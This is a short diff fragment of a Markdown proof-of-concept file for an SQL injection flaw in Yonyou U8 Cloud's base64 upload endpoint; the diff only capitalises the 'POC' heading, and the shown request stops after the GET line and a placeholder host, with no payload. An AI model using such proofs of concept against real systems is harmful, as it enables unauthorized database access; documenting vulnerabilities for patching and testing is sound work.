@@ -1,7 +1,7 @@
 ## 用友U8_Cloud-base64存在SQL注入漏洞
 
 
-## poc
+## POC
 ```
 GET /u8cloud/api/file/upload/base64 HTTP/1.1
 Host: your-ip
